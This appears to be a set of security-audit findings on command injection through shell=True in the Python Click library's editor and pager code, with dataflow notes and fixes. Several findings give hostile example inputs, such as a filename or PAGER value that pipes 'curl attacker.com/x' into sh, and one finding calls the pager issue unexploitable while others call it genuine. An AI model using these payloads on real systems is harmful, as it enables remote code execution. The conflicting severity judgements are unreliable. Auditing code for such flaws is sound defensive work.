findings.description: OS command injection in Editor.edit_files: filenames are interpolated into a shell command string executed with shell=True; double-quoting does not prevent $(...) or backtick command substitution, so any filename containing shell metacharacters executes arbitrary commands.
findings.reasoning: The `filenames` iterable is supplied by callers of `click.edit(..., filename=...)`/`Editor.edit_files`, which is a public API (src/click/termui.py:772 passes user-supplied `filename` straight through). Each filename is only wrapped in literal double quotes and then concatenated into a single string executed by `/bin/sh` via `shell=True`. Double quotes do NOT neutralize `$( )` or backtick command substitution, and a filename containing a `"` character breaks out of the quoting entirely. Therefore a filename controlled by an untrusted party (e.g. a path derived from user input, a repository-supplied file list, or a filename downloaded/created by an attacker) results in arbitrary command execution with the privileges of the process. The editor value is likewise concatenated unquoted (it comes from the `editor` argument or EDITOR/VISUAL env).\n\nNote the tempfile-based path (`self.edit_files((name,))` with a tempfile.mkstemp name) is safe; the risk applies when the library consumer forwards an externally-influenced filename.

evidence.dataflow_analysis: click.edit(filename=...) [src/click/termui.py:772 `ed.edit_files(filenames=filename)`] -> Editor.edit_files(filenames) -> exc_filename string built via f-string -> subprocess.Popen(..., shell=True). No shlex.quote() or validation is applied; only naive double-quote wrapping.
evidence.notes: grep for shell=True in src/click/_termui_impl.py returns exactly two hits: line 453 (_pipepager) and line 603 (edit_files). This is the only one where a caller-supplied, potentially untrusted value (filename) reaches a shell string.

An attacker who can set PAGER already controls the environment/execution of the process (equivalent privilege), so this is not an elevation of privilege. `cmd_path` is additionally resolved through `shutil.which()`. This is intentional pager configuration behaviour, not an injectable sink reachable from untrusted input. (The `shell=True` combined with a list is arguably sloppy, but not exploitable.)

findings.description: Pager subprocess is launched with shell=True while command name/arguments originate from the attacker-influenced PAGER environment variable (via shlex.split), enabling shell interpretation of the command string
findings.code_snippet:
c = subprocess.Popen(
        [str(cmd_path)] + cmd_params,
        shell=True,
        stdin=subprocess.PIPE,
        env=env,
        errors="replace",
        text=True,
    )
findings.reasoning: _pipepager() receives `cmd_parts`, which on the PAGER path comes directly from `shlex.split(os.environ.get("PAGER", ""), posix=False)` (pager(), line 382) and on the fallback path is `["less"]` / `["more"]`. The resolved executable path is passed to subprocess.Popen together with `shell=True`. Because shell=True is set, the argument vector is handed to a shell for parsing instead of being executed directly. On Windows/POSIX shells a combined command line is interpreted, meaning any shell metacharacters that end up in the joined command string (metacharacters in the resolved executable path — e.g. a PATH directory such as `/tmp/x;id` or a name containing spaces/quotes — or platform-specific list-to-command-line joining of cmd_params) are executed by the shell rather than treated as literal argv entries. The shell=True flag is unnecessary here: the code already resolves the binary with shutil.which() and builds an argv list, so removing shell=True is safe. This is a classic CWE-78/CWE-88 pattern (shell invocation with attacker-influenced environment data plus unescaped argument composition) and produces broken behavior/quoting for pagers with flags. The single-result CodeQL query specifically flags `cmd=BinaryExpr shell=True` at this line.

evidence.dataflow_analysis: os.environ['PAGER'] -> shlex.split(posix=False) -> pager_cmd_parts -> _pipepager(cmd_parts) -> cmd_path/cmd_params -> subprocess.Popen([...], shell=True). The sink intentionally invokes a shell although a fully resolved executable path and argv list are already available.
evidence.notes: grep for 'shell=True' in src returned exactly two hits: line 453 (this Popen) and line 603 (Editor.edit_files). No sanitization/allow-list for PAGER; only shutil.which existence check. Fix: drop shell=True (and quote/validate PAGER parts).

findings.description: Editor.edit_files builds a shell command line from the editor string and caller-supplied filenames and executes it with shell=True; filenames are only wrapped in double quotes, which does not stop $()/backtick expansion or a quote break-out
findings.reasoning: Discovered during review of the shell=True sinks (grep for 'shell=True' returned this line in addition to the reported one). `edit_files()` concatenates `self.get_editor()` (from the `editor` argument of `click.edit()`, or the `VISUAL`/`EDITOR` environment variables) with filenames joined into a single string and passes the whole string to `subprocess.Popen(args=..., shell=True)`. Two injection vectors exist: (1) filenames are merely wrapped in double quotes — POSIX shells still perform command substitution inside double quotes, so a filename such as `$(id>/tmp/pwned)` or a name containing a `"` character breaks out and injects arbitrary shell commands; (2) the editor string is interpolated unquoted, so an editor value containing metacharacters (`;`, `&&`, `|`) executes additional commands. `click.edit(filename=...)` is a public API that accepts caller/possibly user-derived paths (see src/click/termui.py:772 `ed.edit_files(filenames=filename)`), so any application forwarding user-supplied file paths to click.edit exposes command execution. The safe implementation would pass an argv list without shell=True (or use shlex.quote).

findings.description: Command injection in _pipepager: subprocess.Popen(..., shell=True) with PAGER-derived arguments is interpreted by /bin/sh
findings.code_snippet:
c = subprocess.Popen(
        [str(cmd_path)] + cmd_params,
        shell=True,
        stdin=subprocess.PIPE,
        env=env,
        errors="replace",
        text=True,
    )
findings.reasoning: `_pipepager` splits the `PAGER` environment variable with `shlex.split(..., posix=False)` (line 382) and passes the resulting list to `_pipepager`. Here the list `[str(cmd_path)] + cmd_params` is executed with `shell=True`. On POSIX, when `shell=True` is used with a sequence, CPython joins the arguments with single spaces and hands the resulting string to `/bin/sh -c`, so the shell re-parses the arguments and metacharacters (`;`, `|`, `&&`, `$(...)`, backticks, `>` ...) in the PAGER value are honored. Only `cmd_parts[0]` is validated through `shutil.which()`, so any payload placed in the *remaining* parameters executes. Example: `PAGER='less ; curl attacker.com/x | sh'` → `shlex.split(..., posix=False)` yields `['less', ';', 'curl', 'attacker.com/x', '|', 'sh']`, `shutil.which('less')` succeeds, and `/bin/sh -c "less ; curl attacker.com/x | sh"` runs the attacker command. The code is reachable from any CLI using `click.echo_via_pager`/`click.pager` (i.e. any tool that pages help/long output) whenever the process environment is attacker-influenced (CI, sudo/`env_keep`, setuid-ish wrappers, container/TTY forwarding, web terminals). The `shell=True` is entirely unnecessary here since an argv list is already available, which is why this is a genuine injection sink rather than an intentional feature.

Only element 0 is constrained by shutil.which().

findings.description: Command injection in Editor.edit_files: f-string command line built from $EDITOR/$VISUAL and filenames is run with shell=True
findings.reasoning: `edit_files` builds a single shell command string `f"{editor} {exc_filename}"` and executes it with `shell=True`. Two tainted inputs flow in: (1) `editor`, taken from the `editor` argument of `click.edit()`, or from the `VISUAL`/`EDITOR` environment variables via `get_editor()`, and (2) `filenames` (from `click.edit(filename=...)`), which are wrapped only in double quotes at line 600: `f'"{filename}"'`. Filenames/paths containing a double quote or shell metacharacters break out of that quoting, e.g. a filename `x"; curl attacker.com/x|sh; echo ".txt` yields `vim "x"; curl attacker.com/x|sh; echo ".txt"`, executing arbitrary commands. Because `env` forwarded to the editor is also attacker-suppliable, and the whole thing goes through `/bin/sh -c`, any `;`, `$( )`, backtick or `|` in either input is executed. An argv list would have made quoting unnecessary, so the shell here is the injected attack surface.
